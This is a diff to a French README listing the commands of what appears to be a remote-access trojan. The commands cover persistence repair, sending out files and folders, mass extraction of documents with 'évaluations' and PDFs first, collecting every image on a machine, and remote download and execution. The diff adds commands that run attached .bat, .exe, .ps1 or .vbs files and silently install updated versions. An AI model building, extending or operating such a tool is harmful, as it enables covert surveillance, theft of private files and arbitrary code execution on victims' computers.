@@ -90,6 +90,8 @@ veille des nouveaux fichiers (15 s), réparation de persistance (3 min).
 | `!download <cible>` | envoie fichier ou dossier (zip automatique) |
 | `!upload <url> <dest>` | télécharge depuis une URL |
 | `!exec <fichier> [args]` | exécute un fichier local — ex. `!exec C:\Temp\setup.exe /S` |
+| `!exec` + fichier joint | télécharge la pièce jointe et l exécute (.bat, .exe, .ps1, .vbs) |
+| `!new` + exe joint | installe la nouvelle version et la lance en arrière-plan |
 | `!files` | extraction massive (évaluations et PDF d'abord) |
 | `!search <motif> [n]` | envoie les fichiers qui contiennent le motif |
 | `!images` | toutes les images du poste |
